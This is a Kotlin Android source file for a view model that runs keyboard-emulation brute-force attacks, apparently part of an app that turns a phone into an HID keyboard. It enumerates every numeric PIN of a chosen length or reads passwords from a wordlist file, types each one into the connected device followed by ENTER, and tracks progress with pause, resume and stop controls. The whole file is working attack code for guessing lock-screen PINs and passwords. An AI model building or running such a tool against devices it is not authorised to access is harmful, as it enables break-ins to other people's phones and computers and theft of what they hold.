package com.example.rabit.ui.automation

import android.app.Application
import android.net.Uri
import android.util.Log
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.example.rabit.data.repository.KeyboardRepositoryImpl
import com.example.rabit.domain.repository.KeyboardRepository
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.asStateFlow
import java.io.BufferedReader
import java.io.InputStreamReader
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.app.PendingIntent
import androidx.core.app.NotificationCompat
import android.app.NotificationChannel
import android.app.NotificationManager
import android.os.Build

class HidBruteForceViewModel(application: Application) : AndroidViewModel(application) {
    private val repository: KeyboardRepository = KeyboardRepositoryImpl(application)
    
    private val _isAttacking = MutableStateFlow(false)
    val isAttacking: StateFlow<Boolean> = _isAttacking.asStateFlow()

    private val _autoEnter = MutableStateFlow(true)
    val autoEnter: StateFlow<Boolean> = _autoEnter.asStateFlow()

    fun toggleAutoEnter() {
        _autoEnter.value = !_autoEnter.value
    }

    private val _currentAttempt = MutableStateFlow("")
    val currentAttempt: StateFlow<String> = _currentAttempt.asStateFlow()

    private val _progress = MutableStateFlow(0f)
    val progress: StateFlow<Float> = _progress.asStateFlow()

    private val _isPaused = MutableStateFlow(false)
    val isPaused: StateFlow<Boolean> = _isPaused.asStateFlow()

    private val _stats = MutableStateFlow(AttackStats())
    val stats: StateFlow<AttackStats> = _stats.asStateFlow()

    private var attackJob: Job? = null

    private val actionReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.action) {
                "HID_BRUTE_FORCE_PAUSE" -> pauseAttack()
                "HID_BRUTE_FORCE_RESUME" -> resumeAttack()
                "HID_BRUTE_FORCE_STOP" -> stopAttack()
            }
        }
    }

    init {
        createNotificationChannel(application)
        val filter = IntentFilter().apply {
            addAction("HID_BRUTE_FORCE_PAUSE")
            addAction("HID_BRUTE_FORCE_RESUME")
            addAction("HID_BRUTE_FORCE_STOP")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            application.registerReceiver(actionReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            application.registerReceiver(actionReceiver, filter)
        }
    }

    private fun createNotificationChannel(context: Context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "hid_brute_force_channel",
                "HID Brute Force",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = context.getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    fun pauseAttack() {
        _isPaused.value = true
        updateNotification()
    }

    fun resumeAttack() {
        _isPaused.value = false
        updateNotification()
    }

    private fun updateNotification() {
        if (!_isAttacking.value) return
        val context = getApplication<Application>()
        
        val pauseIntent = Intent("HID_BRUTE_FORCE_PAUSE").setPackage(context.packageName)
        val pausePending = PendingIntent.getBroadcast(context, 1, pauseIntent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)

        val resumeIntent = Intent("HID_BRUTE_FORCE_RESUME").setPackage(context.packageName)
        val resumePending = PendingIntent.getBroadcast(context, 2, resumeIntent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)

        val stopIntent = Intent("HID_BRUTE_FORCE_STOP").setPackage(context.packageName)
        val stopPending = PendingIntent.getBroadcast(context, 3, stopIntent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)

        val builder = NotificationCompat.Builder(context, "hid_brute_force_channel")
            .setSmallIcon(android.R.drawable.ic_menu_edit)
            .setContentTitle("HID Brute Force: " + if (_isPaused.value) "Paused" else "Running")
            .setContentText("Current Attempt: ${_currentAttempt.value}")
            .setOngoing(true)
            .setOnlyAlertOnce(true)
            
        if (_isPaused.value) {
            builder.addAction(android.R.drawable.ic_media_play, "Resume", resumePending)
        } else {
            builder.addAction(android.R.drawable.ic_media_pause, "Pause", pausePending)
        }
        builder.addAction(android.R.drawable.ic_delete, "Stop", stopPending)

        val manager = context.getSystemService(NotificationManager::class.java)
        manager.notify(444, builder.build())
    }

    data class AttackStats(
        val totalAttempts: Int = 0,
        val completedAttempts: Int = 0,
        val speed: String = "0 p/s",
        val estimatedTime: String = "Unknown"
    )

    enum class Charset(val characters: String) {
        NUMERIC("0123456789"),
        LOWERCASE("abcdefghijklmnopqrstuvwxyz"),
        ALPHANUMERIC("abcdefghijklmnopqrstuvwxyz0123456789")
    }

    fun startNumericAttack(length: Int, delayMs: Long, suffix: String = "ENTER") {
        val total = Math.pow(10.0, length.toDouble()).toInt()
        startBruteForce(Charset.NUMERIC, length, total, delayMs, suffix)
    }

    fun startWordlistAttack(uri: Uri, delayMs: Long, suffix: String = "ENTER") {
        if (_isAttacking.value) return
        _isAttacking.value = true
        _isPaused.value = false
        updateNotification()
        
        attackJob = viewModelScope.launch(Dispatchers.IO) {
            try {
                val lines = mutableListOf<String>()
                getApplication<Application>().contentResolver.openInputStream(uri)?.use { stream ->
                    BufferedReader(InputStreamReader(stream)).use { reader ->
                        var line: String?
                        while (reader.readLine().also { line = it } != null) {
                            line?.let { lines.add(it) }
                        }
                    }
                }

                val total = lines.size
                _stats.value = AttackStats(totalAttempts = total)

                lines.forEachIndexed { index, password ->
                    if (!isActive) return@launch
                    while (_isPaused.value) {
                        delay(100)
                        if (!isActive) return@launch
                    }
                    _currentAttempt.value = password
                    _progress.value = (index + 1).toFloat() / total.toFloat()
                    _stats.value = _stats.value.copy(completedAttempts = index + 1)
                    updateNotification()
                    
                    repository.sendText(password)?.join()
                    if (suffix.isNotBlank()) repository.executeKeyCombo(suffix)
                    
                    delay(delayMs)
                }
            } catch (e: Exception) {
                Log.e("HidBruteForce", "Attack failed", e)
            } finally {
                _isAttacking.value = false
                _isPaused.value = false
                getApplication<Application>().getSystemService(NotificationManager::class.java).cancel(444)
            }
        }
    }

    private fun startBruteForce(
        charset: Charset,
        length: Int,
        total: Int,
        delayMs: Long,
        suffix: String
    ) {
        if (_isAttacking.value) return
        _isAttacking.value = true
        _isPaused.value = false
        updateNotification()
        
        attackJob = viewModelScope.launch(Dispatchers.IO) {
            try {
                _stats.value = AttackStats(totalAttempts = total)
                
                for (i in 0 until total) {
                    if (!isActive) break
                    while (_isPaused.value) {
                        delay(100)
                        if (!isActive) break
                    }
                    val attempt = i.toString().padStart(length, '0')
                    _currentAttempt.value = attempt
                    _progress.value = (i + 1).toFloat() / total.toFloat()
                    _stats.value = _stats.value.copy(completedAttempts = i + 1)
                    updateNotification()

                    repository.sendText(attempt)?.join()
                    if (suffix.isNotBlank()) repository.executeKeyCombo(suffix)
                    
                    delay(delayMs)
                }
            } finally {
                _isAttacking.value = false
                _isPaused.value = false
                getApplication<Application>().getSystemService(NotificationManager::class.java).cancel(444)
            }
        }
    }

    private val _wordlistPreview = MutableStateFlow<List<String>>(emptyList())
    val wordlistPreview: StateFlow<List<String>> = _wordlistPreview.asStateFlow()

    fun loadWordlist(uri: Uri) {
        viewModelScope.launch {
            try {
                val lines = withContext(Dispatchers.IO) {
                    getApplication<Application>().contentResolver.openInputStream(uri)?.use { input ->
                        BufferedReader(InputStreamReader(input)).useLines { it.take(100).toList() }
                    } ?: emptyList()
                }
                _wordlistPreview.value = lines
            } catch (e: Exception) {
                _wordlistPreview.value = listOf("Error loading file: ${e.localizedMessage}")
            }
        }
    }

    fun stopAttack() {
        attackJob?.cancel()
        _isAttacking.value = false
        _isPaused.value = false
        getApplication<Application>().getSystemService(NotificationManager::class.java).cancel(444)
    }

    override fun onCleared() {
        super.onCleared()
        stopAttack()
        try {
            getApplication<Application>().unregisterReceiver(actionReceiver)
        } catch (e: Exception) {}
    }
}
